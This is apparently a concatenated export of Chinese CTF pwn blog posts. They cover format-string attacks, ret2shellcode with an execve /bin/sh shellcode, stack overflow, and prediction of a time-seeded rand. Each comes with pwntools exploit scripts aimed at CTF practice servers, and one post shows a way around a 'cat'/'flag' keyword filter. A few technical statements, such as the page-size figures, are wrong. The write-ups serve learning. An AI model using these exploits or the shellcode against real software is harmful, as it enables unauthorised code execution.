我们只需要了解他是linux系统中的随机伪设备，他的作用就是提供永不为空的随机字节流 浅看一下他生成的字节流长什么样子 说回这道题，看逻辑应该是要我们输入这个随机数，如果一样就调用system(&#x2F;bin&#x2F;sh) 而存放这个随机数的就是dword_804C044的地址 那我们这时候应该有两种想法，一种是泄露这个随机数，输入他 还有一种是通过修改这个随机数的值来判定成功 第一种办法本人是没法做出来，感兴趣的可以试一试 那么讲一下第二种办法，由上文的学习我们已经知道 要想用格式化字符串漏洞泄露栈上的内容，需要我们知道目标地址和格式化字符串存放的地址的偏移 用gdb看一下偏移 现在main函数处设置一个断点(这里由于main函数被删符号表了，所以b main的话gdb查找不到函数的，删符号表的体现就是在ida中main函数不是粗体字，ida只是凭借逻辑识别他为main函数) 接着运行并且跳转到输入字符串这边，我们先输入8个A看一下栈分布的情况 这里还是先解释一下x&#x2F;20wx $esp这个命令是什么意思 其作用是用gdb查看内存 格式: x &#x2F;n u f n是要显示的内存单元个数 f表示显示方式, 可取如下值 u表示一个地址单元的长度 这里的x&#x2F;20wx 的意思就是说查看20个4字节长度的内存单元 并且按16进制的格式显示 至于为什么是以esp为初始地址显示 是因为格式化字符串%n进行任意地址改写是在ESP所指向的地址处所指向的地址处写入数据(可以理解为栈顶) 所以我们需要知道当我们最终构造的payload中需要改写的地址内容距离esp的偏移是多少 而且也正是因为这一点，决定了我们可以不用一定要把格式化字符串放在栈顶 这里可以看到代表着AAAAAAAA的两个0x4141414141距离esp的偏移是10和11(如果我们只输入4个A只会占用偏移10这个字长，因为这是32位程序，等下编写exp的不要被搞晕了) 所以此时我们要如何构造我们的payload？ 此时我们将格式化字符放在payload的最后 12345678from pwn import *io = remote(&quot;node4.buuoj.cn&quot;,25117)context.log_level = &quot;debug&quot;addr = 0x0804C044payload = p32(addr)+b&quot;%10$n&quot;io.sendline(payload)io.sendline(&quot;4&quot;)io.interactive() 由于此时程序是32位，%n前面传入的p32(addr)则为一个字长，四个字节，所以此时addr处的随机数就被我们修改为4 我们接着再输入4，就成功破解了随机数 学会了？觉得很简单？再来看一个比较绕的exp 12345678from pwn import *io = remote(&quot;node4.buuoj.cn&quot;,25117)context.log_level = &quot;debug&quot;addr = 0x0804C044payload = b&quot;AAAAAAA%13$n&quot;+p32(addr)io.sendline(payload)io.sendline(&quot;7&quot;)io.interactive() 这次我们把addr放在后面传输了，可以看到和上文的区别是前面多了7个A而且这次随机数被我们修改成7了 看不懂没关系，接下来详解 我们再次明确一下概念，这里提到的偏移指的是距离esp的字长数 那么我们要实现改写的是addr这个地址的随机数对吧 此时我们先传入的是字符串“AAAAAAA%13$n”他的字节数是多少？ 很明显是12个字节，也就是三个字长 我们之前通过gdb已经明白了，我们写入栈中的第一个字长是位于10偏移处，也就是AAAA 那么接下里的AAA%就会被写入11偏移 13$n就会被写入12偏移 而此时的addr就会被存放在13偏移处，所以此时我们的n就要从10更改为13 似乎有点能理解了是吧？ 实际上pwntools中有一个函数，他可以自动帮我们生成这样的payload，而我们要做到的只是给予他基本的参数 fmtstr_payload(offset, {addr: data}) offset就是我们需要更改内容的地址距离esp的偏移 addr就是我们需要改写内容的地址 data就是我们需要改写的数据 来看一下接下来的exp可以怎么写 123456789from pwn import*io = remote(&quot;node4.buuoj.cn&quot;,25117)io.recvuntil(&quot;your name:&quot;)payload=fmtstr_payload(10,&#123;0x804C044:1&#125;)io.sendline(payload)io.recvuntil(&quot;your passwd:&quot;)io.sendline(&quot;1&quot;)io.recv()io.interactive() 可以看到，我们就这样轻易的将addr处的随机数更改为了1 是不是比之前的两种payload构造办法简单许多？","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"Linux内核","slug":"Linux内核","date":"2022-09-22T09:36:45.000Z","updated":"2022-09-22T11:30:49.874Z","comments":true,"path":"2022/09/22/Linux内核/","link":"","permalink":"http://example.com/2022/09/22/Linux%E5%86%85%E6%A0%B8/","excerpt":"","text":"先从内核开始了解 什么是内核?1.内核的作用是将Linux系统的应用程序的请求传递给硬件，并且充当底层驱动程序，对linux中的各种设备和组件进行寻址 可以将其理解为中介，卖家(计算机)和买家(使用者)需要通过内核来进行交互 2.从应用程序的角度来讲，内核是其所能接触到的最底层，即硬件和应用程序并不能直接交互 3.内核实际上是一个资源管理器，负责分配资源(cpu，内存等)给应用程序和硬件 4.内核对于系统而言是一个库，系统调用内核就像调用一个函数一样 内核的实现策略其分为两个部分: 微内核：最基本的操作都由中央内核(微内核)实现，其他功能分配给另外的独立进程，每个独立进程都和微内核有专门的通信接口来通信 宏内核：内核中的所有代码都打包到一个文件里面，内核中的所有函数都可以访问到内核的其他地方 不同的进程进行的时候，就是基于内核，每个进程的虚拟地址都是独立的 Linux进程在linux中，每一个进程都是基于父进程创建的子进程，第一个进程是init 其用来初始化系统，所有的子进程都起源于init 内核中的所有进程都有自己标识符(ID) 用户或者其他进程可以通过标识符来访问进程","categories":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/categories/Linux/"}],"tags":[]},{"title":"Linux操作命令学习前言","slug":"linux操作命令学习前言","date":"2022-09-22T09:05:37.000Z","updated":"2022-09-22T09:28:56.831Z","comments":true,"path":"2022/09/22/linux操作命令学习前言/","link":"","permalink":"http://example.com/2022/09/22/linux%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0%E5%89%8D%E8%A8%80/","excerpt":"","text":"在完成HUBUCTF2022新生赛的pwn题时，遇到了一道比较有意思的题目，其关乎到了Linux的操作命令 并且linux也是pwn的学习中，担当重任的角色，鉴于我对他的了解极少，所以开设一个专题，专门用来记录自己的linux学习 [HUBUCTF 2022 新生赛]singout什么附件都没有给我们，那我们只能nc看看 看起来好像直接调用了system(&#x2F;bin&#x2F;sh)，可能是签到题？ 我们再输入一个hello world确认一下猜测 报错:sh: 1: hello: not found root@pwn:~# sh: 1: world: not found 猜想正确，那我们接下来ls查看当前目录的文件，找一下flag，cat将其内容输出到我们终端上不就好了？ 但是想法很美好，输入了cat flag却提醒我们NO cat fot you！并且中断了连接 说明可能有检测字符串，不让我们使用cat？ 那我们试试more和less 他们同样可以起到查看文件内容的作用 似乎把flag这个字符串也检测了，那我们又该如何向终端传达我们想要cat flag.txt的目的呢？ 不如试试 * 这个命令补全 同时我们也转化一下思路，为什么一定要用cat输出内容呢？我们能不能直接打开flag.txt 这里用到了“.&#x2F;”其作用是打开linux系统中的文件 可以看到我们就这样得到了flag了 那么还有没有别的办法呢 可以看到似乎找不到flag.txt这个文件并且cat也不能通过*来补全，操作系统太蠢了，那我们多给他一些指引 这里用到pwd这个命令(查看当前目录) 得知了存放flag.txt的目录是&#x2F;pwn 那么接下来就好办了 本文的wp用意在于使初学pwn的人意识到linux的重要性，我们将在日后进一步了解这个操作系统","categories":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/categories/Linux/"}],"tags":[]},{"title":"Ret2shellcode","slug":"Ret2shellcode","date":"2022-09-21T08:37:21.000Z","updated":"2022-09-21T09:12:17.474Z","comments":true,"path":"2022/09/21/Ret2shellcode/","link":"","permalink":"http://example.com/2022/09/21/Ret2shellcode/","excerpt":"","text":"这次我们再来介绍一个栈的经典题型 在我们先前遇到的题目中，都有着出题人为我们提供的后门函数，如果没有后门函数，我们又该如何自己构建shellcode呢？ 带着这个疑问，我们开始今天的学习 如何写入system（&#x2F;bin&#x2F;sh）？由于题目通常都会开启NX保护，所以我们要想在栈中写入字符串是不现实的打算 我们好好想想，在内存块的五个分区中，还有哪个区块是可以为我们自由编辑的，这里我们想到了用来存储未初始化的全局变量区bss段 那么如何写入呢？ 我们先前已经知道了，计算机读不懂高级语言，即system(&#x2F;bin&#x2F;sh) 先前我们已经通过构造rop的方式用汇编语言指引执行流 这次我们尝试用机器码来将shellcode注入到内存中 常用的shellcode：”\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05” 这个shellcode只有23个字节，当题目的输入字长给的不够多的时候可以使用这个 当然还有第二种构造机器码的方式 shellcode &#x3D; asm(shellcraft.sh()) 但是你很快就会发现，为什么自己在32位情况下可以使用，但是64位下就不行 我们还需要在后面加上amd64才能使其输出64位的机器码 当然我们也可以通过**context.arch &#x3D; “amd64”**来使环境转化为64位，于是我们在接下来即使不用amd64也能输出64位机器码 例题解析这里以NewStarCTF 2022新生赛公开赛 的ret2shellcode作为例题讲解 老规矩看一下保护机制，NX开了，看来不能在栈上写入 ida看一下具体情况 1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4[40]; // [rsp+0h] [rbp-30h] BYREF void *buf; // [rsp+28h] [rbp-8h] init(argc, argv, envp); buf = mmap((void *)0x233000, 0x1000uLL, 7, 34, -1, 0LL); puts(&quot;Hello my friend.Any gift for me?&quot;); read(0, buf, 0x100uLL); puts(&quot;Anything else?&quot;); read(0, v4, 0x100uLL); puts(&quot;Ok.See you!&quot;); return 0;&#125; 出现了个mmap函数，用来干什么的？ 可以简单理解为 开辟一块空间存放我们输入的值 其地址为第一个参数addr(0x233000) 那么我们的目的就是将shellcode写入这块空间，然后在接下来的栈溢出中控制程序执行流到shellcode 12345678910from pwn import*io = remote(&quot;node4.buuoj.cn&quot;,25533)shellcode = &quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;io.recvuntil(&quot;Hello my friend.Any gift for me?&quot;)io.sendline(shellcode)io.recvuntil(&quot;Anything else?&quot;)payload = cyclic(56)+p64(0x233000)io.sendline(payload)io.recv()io.interactive() 其实本质上还是栈溢出控制程序执行流到后门函数，只不过这个后门函数是我们自己存入到程序中的，还是挺好理解的","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"pwn1_sctf_2016","slug":"pwn1-sctf-2016","date":"2022-09-19T12:00:48.000Z","updated":"2022-09-19T12:22:52.824Z","comments":true,"path":"2022/09/19/pwn1-sctf-2016/","link":"","permalink":"http://example.com/2022/09/19/pwn1-sctf-2016/","excerpt":"","text":"buuctf中的一题，纯纯烧杯题，这题注重考查c++逆向(但是我还是觉得是动手调试的能力) 老规矩了，checksec看一下保护机制和位数 感觉像是栈溢出，不确定，ida看看 哇，看到这函数列表懵逼了，不过别怕，仔细翻一番 逮到三个看名字有用的，f5看一下 main函数： 12345int __cdecl main(int argc, const char **argv, const char **envp)&#123; vuln(); return 0;&#125; vuln函数： 1234567891011121314151617181920212223242526272829int vuln()&#123; const char *v0; // eax int v2; // [esp+4h] [ebp-54h] char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF char v4[4]; // [esp+3Ch] [ebp-1Ch] BYREF char v5[7]; // [esp+40h] [ebp-18h] BYREF char v6; // [esp+47h] [ebp-11h] BYREF char v7[7]; // [esp+48h] [ebp-10h] BYREF char v8[5]; // [esp+4Fh] [ebp-9h] BYREF printf(&quot;Tell me something about yourself: &quot;); fgets(s, 32, edata); std::string::operator=(); std::allocator&lt;char&gt;::allocator(&amp;v6, s); std::string::string(v5, &quot;you&quot;, &amp;v6); std::allocator&lt;char&gt;::allocator(v8, v2); std::string::string(v7, &quot;I&quot;, v8); replace((std::string *)v4); std::string::operator=(&amp;input, v4, v7, v5); std::string::~string(v4); std::string::~string(v7); std::allocator&lt;char&gt;::~allocator(v8); std::string::~string(v5); std::allocator&lt;char&gt;::~allocator(&amp;v6); v0 = (const char *)std::string::c_str((std::string *)&amp;input); strcpy(s, v0); return printf(&quot;So, %s\\n&quot;, s);&#125; gatflag函数： 1234int get_flag()&#123; return system(&quot;cat flag.txt&quot;); 看完人更傻了，虽然getflag明显就是要我们栈溢出，跳转到这个函数，但是vuln写的是什么？ 百度完应该是c++中std::string相关的用法 不过这题应该是要我们会用debug来调试程序 我们重点注意一下那一串天书里面的“I”和“you”，突破口肯定是这俩 浅写段exp，debug看看有什么玄机 123456from pwn import*io = remote(&quot;node4.buuoj.cn&quot;,29397)context.log_level = &quot;debug&quot; #这段就是打开debug，具体是什么，下面看到图你就知道了payload = b&#x27;I&#x27;*6io.sendline(payload)io.recv() 好家伙，我们可以看到明明传的是I，结果都变成了you，那到这里很明显了，这题就是把字符串中的i替换成了you 我们再来看看能不能进行栈溢出 可以看到，我们只能输入0x20字节的数据给s，但是他距离ebp有0x3c，不够怎么办？ 刚才不是输入I可以变成you吗？这不是一个字节顶三个字节，一节更比一节强（南孚打钱） 那思路很明显了，输入20个字长的I，就相当于输入了60个字长的you，我们就可以进行栈溢出了 exp: 123456from pwn import*io = remote(&quot;node4.buuoj.cn&quot;,29397)getflag_addr = 0x8048f0dpayload = b&#x27;I&#x27;*20+cyclic(4)+p32(getflag_addr)io.sendline(payload)io.recv()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"栈的基础知识2","slug":"栈的基础知识2","date":"2022-09-18T13:54:27.000Z","updated":"2022-09-25T07:38:54.952Z","comments":true,"path":"2022/09/18/栈的基础知识2/","link":"","permalink":"http://example.com/2022/09/18/%E6%A0%88%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/","excerpt":"","text":"想了想还是专门列一个板块来详讲虚拟内存和栈的详细结构，刚好自己这块的了解也是一知半解的，顺便扫盲一下 cpu缓存从这个问题开始入手整个知识点体系吧 通常情况下，我们可以用cache的大小来区分一个cpu的性能 cache是什么？cache指的是cpu的三级缓存，L1，L2，L3 由于cpu的运算能力远远大于数据传输 所以cpu在接下来的操作会用到的数据就会存放到他自己的缓存中 防止产生传输速度跟不上运算速度的问题 L1缓存中采用的是静态随机访问存储器(RAM)，其还有一种动态RAM 二者区别在于，静态RAM集成度更低，体积更大，价格更为高昂，但是性能强于动态RAM L2和L32缓存便是采用动态RAM 并且 从L1到L3 三个缓存区的大小逐渐增大 但是仍然出现缓存区域不够的问题怎么办？扩大cache显然是最有效的办法，但是其成本过高 所以出现了内存条，即我们台式装机中所熟知的，内存条也一并归类于RAM 虚拟内存我们刚刚讲到，内存不够用时一般时扩大RAM，但是成本高，这里就出现了虚拟内存的用法 其本质是借用硬盘的一部分破碎的空间来使应用程序以为自己拥有了一块连续的内存地址 部分wiki过于学术，不好理解，这里摘取我个人觉得写的易懂有趣的一段描述 原文：虚拟内存详解 - 腾讯云开发者社区-腾讯云 (tencent.com) 这里我们了解一下，32位操作系统的电脑可以寻址到2^32(即寻址0~0xFFFFFFFF（4G）的地址空间) 但是假如你的电脑只有256m的物理内存(即0x~0x0FFFFFFF) 这时候虚拟内存映射到物理内存超出了物理内存地址的范围 那么这还如何调用？ 这里得引入页，页桢，页号等概念 我们首先得知道，虚拟内存分成各个相同大小的页，而物理内存也是分为和前者大小相同的页桢 这就意味着，虚拟内存页数量&gt;物理内存页桢 那么计算机是怎么处理这个问题的？ 页面失效（page fault）功能:他挑选出一个使用最少的页桢，把他放入硬盘，并且使页放入这个空位，修改其映射，使得每个页都有机会被调用到 我们这时候可以再说回计算机是如何寻址虚拟内存地址和物理内存地址的问题 我们仍然要提前了解偏移量和页号的概念 页号就是类似于铭牌，对应的映射到一个页桢 而偏移量就是页(页桢)的大小 这里比如操作系统想要访问一个页号为4的虚拟地址，他就会去该页号对应的页桢号(比如说是8)，如果页不在内存中，就利用页面失效功能，调入页，否则就把页帧号和偏移量传给MMU（CPU的内存管理单元）组成一个物理上真正存在的地址，接着就是访问物理内存中的数据了 MMU：分页内存管理单元,它是一种负责处理（CPU）的内存访问请求的计算机硬件。它的功能包括虚拟内存到物理内存地址的转化(即虚拟内存管理) 接下提一嘴，linux的内存地址空间是4gb，所以每个页的大小为1024*4&#x3D;4mb 转化为16进制则是0x1000 这里就是我们在计算基址偏移的时候，之所以每个函数的后三位都是固定的(同一个libc版本下) 因为同一libc版本下的函数偏移量都是固定的 由于基址的后三位恒为000，所以最终函数的真实地址的后三位也是固定的 内存分区内存一共分为五个区块 bss段 test段 stack段 heap段 data段 全局静态区(bss)：存储未被初始化的全局变量，和data段一样都属于静态分配(可以理解为一开始要多少就给多少)，在编译阶段就确定了大小，不释放 常量区(data): 存储已被初始化的全局变量、常量 **栈空间(stack)**：主要用于函数调用时存储临时变量的，这部分的内存是自动分配，自动释放的 堆空间(heap): 主要用于动态分配，C语言中malloc和free操作堆内存(栈的学习结束后，我们就将迎来堆) 代码区(text): 存储程序的二进制指令，即程序编译后的二进制代码 全局变量：未初始化即int a;初始化即int a &#x3D; 1; 我们先前讲到的栈，就是介于堆和栈中的一块空间","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"HUBUCTF-新生赛-fmt","slug":"HUBUCTF-新生赛-fmt","date":"2022-09-18T05:21:44.000Z","updated":"2022-09-18T11:00:52.652Z","comments":true,"path":"2022/09/18/HUBUCTF-新生赛-fmt/","link":"","permalink":"http://example.com/2022/09/18/HUBUCTF-%E6%96%B0%E7%94%9F%E8%B5%9B-fmt/","excerpt":"","text":"老规矩走个流程，checksec看一下保护机制 好像看不出什么，猜不出他想干啥，拖到ida里面瞧瞧 123456789101112131415161718192021222324252627282930313233343536int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; FILE *stream; // [rsp+8h] [rbp-68h] char format[32]; // [rsp+10h] [rbp-60h] BYREF char s[8]; // [rsp+30h] [rbp-40h] BYREF __int64 v6; // [rsp+38h] [rbp-38h] __int64 v7; // [rsp+40h] [rbp-30h] __int64 v8; // [rsp+48h] [rbp-28h] __int64 v9; // [rsp+50h] [rbp-20h] __int64 v10; // [rsp+58h] [rbp-18h] __int16 v11; // [rsp+60h] [rbp-10h] unsigned __int64 v12; // [rsp+68h] [rbp-8h] v12 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); *(_QWORD *)s = 0LL; v6 = 0LL; v7 = 0LL; v8 = 0LL; v9 = 0LL; v10 = 0LL; v11 = 0; if ( stream ) fgets(s, 50, stream); HIBYTE(v11) = 0; while ( 1 ) &#123; puts(&quot;Echo as a service&quot;); gets(format); printf(format); putchar(10); &#125;&#125; 经典格式化字符串漏洞吧 把flag.txt的内容存储在变量s里面，这题得用到gdb了 教一个办法，像这种调用文件的，建议自己在本地建一个同名文件，方便查看文件在栈中的地址 可以看到我们自己在本机创建的flag.txt此时位于栈上的位置 AAAAAAAA就是我们在gets中输入的值 所以我们可以知道flag和格式化字符串的偏移是11(有可能会有差错，所以我的建议是等下泄露flag的时候扩大范围多试几个) 为什么是11？AAAAAAAA不是和flag只间隔了3个字长？这里是64位和32位栈传参的差异 64位和32位栈传参我在初期栈学习中，就一直注重强调32位和64位的不同，因为我本人在初期学习中，就常常对这二者没有足够的分辨意识 接下来着重讲解这二者的不同 首先是我们之前已经详细讲过的32位传参 具体的传参方式就是在栈上传参，并且根据system和call system调用的不同，参数和函数地址的偏移也不同 我们在之前的阅读中，会注意到频繁出现的esp eip eax ebx等 这里的e就是32位特有，64位情况下的寄存器，通常是以r开头。例如rsp 64位传参的情况相较32位及其不同！！千万不要搞混 在linux操作系统中，前六个参数通过 RDI 、 RSI 、 RDX 、 RCX 、 R8 和 R9 传递 而在windows操作系统中，前四个参数通过 RCX 、 RDX 、 R8 和 R9 来传递 他们的共同点是，其第七个&#x2F;第五个参数就push入栈进行传递(因此上面的偏移值才是6+5[5是从AAAAAAAA开始数到flag]) 既然已经清楚了大致的偏移量，我们开始传入格式化字符串吧、 可以看到果然有些偏差，12才是正确的偏移量 这里又有一个问题了，为什么我们看到的是16进制形式的，而不是字符串形式 这就要从%x的用法着手分析了 x是打印出无0x的16进制 而我们换用%p试一下 转化成字符串看一下 17&#123;FTCSSN 倒过来，是不是像一个flag的格式了，说明这题就是用%p 这是为什么？%p和%x有什么区别？而且这里为什么又是倒转过来的？别急，慢慢讲 1.为什么这里要用%p%p是打印出所指栈位置中的地址指向的地方的内容 在搞懂这个问题前，我们得先知道，栈中是不会存储字符串的，这一点在栈溢出的时候就体现了出来 我们给system传参的时候是binsh字符串的地址，而不是binsh字符串 所以，看起来flag是存储到了栈中，其实只是他的地址被保存到了栈中 2.为什么是倒转过来的这里涉及到了小端序和大端序的问题 这二者都属于字节序，什么是字节序？为什么要有字节序？ 字节序指电脑内存中占用多个字节的数据的字节排列顺序 在几乎所有的平台上，多字节对象都被存储为连续的字节序列 为什么会有字节序，统一用大端序不行吗？答案是，计算机先处理低位字节，效率比较高，因为计算都是从低位开始的。所以，计算机的内部处理都是小端字节序。在计算机内部，小端序被广泛应用于现代 CPU 内部存储数据；而在其他场景，比如网络传输和文件存储则使用大端序。 那么什么是小端序和大端序？ 大端序将数据的低位字节存放在内存的高位地址，高位字节存放在低位地址 小端序将一个多位数的低位放在较小的地址处，高位放在较大的地址处 看不懂没关系，图文演示一下 上图为小端序的存储状况，作为高位字节的12就放在了低地址 而大端序的存储，就比较符合我们人类的阅读习惯 这里因为大端序我们接触的少，再加上小端序已经作了详细的解释，同理可得，就不进行作图了(真的不是我懒) 截止到现在，本题涉及到的知识点已经全部讲完了，如果想练练手的话，可以试试ctfshow中的pwn04(格式化字符串泄露canary)","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"HUBUCTF.新生赛.ez_pwn","slug":"HUBUCTF-新生赛-ez-pwn","date":"2022-09-17T14:27:18.000Z","updated":"2022-09-18T05:07:24.132Z","comments":true,"path":"2022/09/17/HUBUCTF-新生赛-ez-pwn/","link":"","permalink":"http://example.com/2022/09/17/HUBUCTF-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-pwn/","excerpt":"","text":"ps:本题思路由youlin师傅指引 checksec一下，查看一下保护机制 保护全开 64位？有点被吓到了 不过这种题估计都是flag已经准备好了或者自带shellcode 拖进ida看看 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+4h] [rbp-8Ch] BYREF int i; // [rsp+8h] [rbp-88h] int v6; // [rsp+Ch] [rbp-84h] unsigned int seed[2]; // [rsp+10h] [rbp-80h] FILE *stream; // [rsp+18h] [rbp-78h] char v9[32]; // [rsp+20h] [rbp-70h] BYREF char s[8]; // [rsp+40h] [rbp-50h] BYREF __int64 v11; // [rsp+48h] [rbp-48h] __int64 v12; // [rsp+50h] [rbp-40h] __int64 v13; // [rsp+58h] [rbp-38h] __int64 v14; // [rsp+60h] [rbp-30h] __int64 v15; // [rsp+68h] [rbp-28h] __int64 v16; // [rsp+70h] [rbp-20h] __int64 v17; // [rsp+78h] [rbp-18h] unsigned __int64 v18; // [rsp+88h] [rbp-8h] v18 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); *(_QWORD *)seed = time(0LL); *(_QWORD *)s = 0LL; v11 = 0LL; v12 = 0LL; v13 = 0LL; v14 = 0LL; v15 = 0LL; v16 = 0LL; v17 = 0LL; puts(&quot;Who goes there?&quot;); gets(v9); printf(&quot;Welcome to my challenge, %s. No one has ever succeeded before. Will you be the first?\\n&quot;, v9); srand(seed[0]); for ( i = 0; i &lt;= 99; ++i ) &#123; v6 = rand() % 100000 + 1; puts(&quot;I am thinking of a number from 1-100000. What is it?&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v4); if ( v6 != v4 ) &#123; puts(&quot;You have failed. Goodbye.&quot;); return 0; &#125; puts(&quot;Impressive.&quot;); &#125; puts(&quot;You&#x27;ve guessed all of my numbers. Here is your reward.&quot;); stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if ( stream ) &#123; fgets(s, 50, stream); puts(s); &#125; puts(&quot;Goodbye.&quot;); return 0;&#125; 用时间做了种子，循环一百次，每次都随机一个数，我们需要输对这个数，算是经典的猜数字吧 一开始看到我们可以自定义赋值的v4和随机数v6是相邻的字节，所以想通过溢出来覆盖v6，使得if判断成立，不过貌似不行 所以还是正常做法吧 随机数，我目前知道的两种做法，一种是溢出数据覆盖seed，这样我们在知晓种子的值的情况下，因为c语言的rand是伪随机(下面就要降到了，我知道你很急，但你先别急)，所以就可以知道随机数的值 还有一种办法是本题将要使用到的，这道题我们可以发现他是用当前时间作为种子，来生成随机数，所以我们只要在exp中也是用当前时间作为种子，就可以得到一样的随机数（这里看不懂的话，是伪随机的概念不清楚） 1234567891011from pwn import *from ctypes import *io=remote(&quot;1.14.71.254&quot;,28056)libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)seed = libc.time(0)libc.srand(seed)io.sendlineafter(b&#x27;Who goes there?&#x27;, b&#x27;chen&#x27;)for i in range(100): buf = libc.rand() % 100000 + 1 io.sendlineafter(b&#x27;What is it?&#x27;, str(buf)) io.recvuntil(b&#x27;\\n&#x27;) 几个疑点 1.cdll.LoadLibrary的用法：看了很多篇猜数字的题解啊，竟然没有一个人对这个函数用法有解释，那没办法了，只能自己wiki了 这个函数就是在python中重新加载文件库 还是有限制的：在64位的windows系统中，一个64位进程不能加载一个32位dll，同理一个32位进程也不能加载一个64位dll。 查资料的时候还看到这个限制的特殊情况，不过看不明白，估计了解的价值也不大，先丢在这，有空来填这个坑，感兴趣的可以自己先看(3条消息) python 调用 C++ dll 32位 64位 问题 ctypes.cdll.LoadLibrary_wowocpp的博客-CSDN博客_python调用32位dll 还有一种更深的用法是这个代码库将允许原生Linux程序从一个WindowsDLL文件中加载或调用功能函数 (3条消息) linux运行dll文件命令,LoadLibrary：一款能够允许Linux程序从DLL文件中加载或调用函数的工具…_七分醉玲珑的博客-CSDN博客 因为涉及到linux和windows的进程间通信和内核相关知识，我自己也还没有搞懂，留个坑吧，看以后有没有时间填上 2.伪随机这里介绍一下c语言中的伪随机 一些基础的c语言知识这里就不多解释了，比如说srand用法和种子的概念 先看看一段代码吧 123456789int main()&#123; for(int i=0; i&lt;10; i++) &#123; printf(&quot;%4d&quot;,rand()); &#125; printf(&quot;\\n&quot;); return 0;&#125; 输出10个随机数，我们两次运行试试 生成的随机数都一样？ 我们不妨这么理解，所谓的rand函数就是根据每个种子分配一张表格，所谓的随机数是从这个表格调用的，所以当我们第二次运行时，由于种子没改变，那么这张表格的数据也不会改变 那么我们如何获得真正意义上的随机数？想一下有什么东西的数据是一直在变化的 我们把目光瞄向时间，函数srand( (unsigned)time( NULL ) ) 中time返回的是1970年1月1日0点到现在时间流失的秒数值 因此，我们这下没法得知种子是多少，也就无法知道这个种子对应的随机数表是什么 但是我们重加载了libc库，同步获取了time返回的种子值，由于time是以秒作为单位的，我们每次for循环得出的随机数和题目的随机数几乎没有差距，所以这道题的随机数就呼之欲出了","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"ROP","slug":"ROP","date":"2022-09-17T01:26:39.000Z","updated":"2022-09-17T03:13:54.531Z","comments":true,"path":"2022/09/17/ROP/","link":"","permalink":"http://example.com/2022/09/17/ROP/","excerpt":"","text":"动态链接和静态链接静态链接和动态链接的相关概念，我们在栈溢出篇曾粗略提到过 我们说到，为了防止每次调用函数都需要将函数的libc库拷贝到文件中，加大文件的存储占用 不如在程序运行时将动态库加载到内存中，多个程序运行只需要调用一份 静态库特点：1.静态库对函数库的链接是放在编译时期完成的2.程序在运行时与函数库再无瓜葛，移植方便。3.浪费空间和资源，因为所有相关的目标文件与牵涉到的函数库被链接合成一个可执行文件4.如果静态库进行更新则应用该库的所有程序都需要重新编译（全量更新）。 动态库特点：1.动态库把对一些库函数的链接载入推迟到程序运行时期。2.可以实现进程之间的资源共享。（因此动态库也称为共享库）3.将一些程序升级变得简单。4.甚至可以真正做到链接载入完全由程序员在程序代码中控制（显示调用） 还是不太清楚？我们这样来理解，我们在吃饭前需要备好碗筷 如果我们每吃一道菜就要准备一副碗筷，这是静态库 如果我们只用一副碗筷就吃完所有菜，这是动态库 ROP在明白了动态库和静态库的区别后，我们接着讲栈溢出的相关内容 我们已经学过的栈溢出，需要函数中有着出题人给我们预先准备好的system函数和binsh字符串 如果没有呢？我们又该从何入手 在开始之前，我们先明白几个概念 1、rop：在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。 2、gadgets：在程序中的指令片段，有时我们为了达到我们执行命令的目的，需要多个gadget来完成我们的功能。gadget最后一般都有ret，因为我们需要将程序控制权(EIP)给下一个gadget。即让程序自动持续的选择堆栈中的指令依次执行。(涉及到接下来的栈变化情况，现在看不懂的没关系，接下来会图片演示详讲) 3、ropgadgets：一个pwntools的一个命令行工具，用来具体寻找gadgets的。例如：我们从pop、ret序列当中寻找其中的eax 4.在linux系统中，函数的调用是有一个系统调用号的 我们接下来详细介绍这个系统调用号 系统调用号Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数 而我们需要用到的system(&#x2F;bin&#x2F;sh)函数的系统调用号为11，也就是0xb 他的系统调用规范是execve(“&#x2F;bin&#x2F;sh”, 0,0) 那么我们如何向栈中传入这一串的数据来达到我们调用system的目的呢？ 计算机语言分为高级语言和低级语言 我们先要知道，像c语言，python语言这样的，是属于高级语言 高级语言指较接近自然语言和数学公式的编程，基本脱离了机器的硬件系统，用人们更易理解的方式编写程序 低级语言包括机器语言(二进制语言)和汇编语言 这两种语言都是面向机器的语言，和具体机器的指令系统密切相关 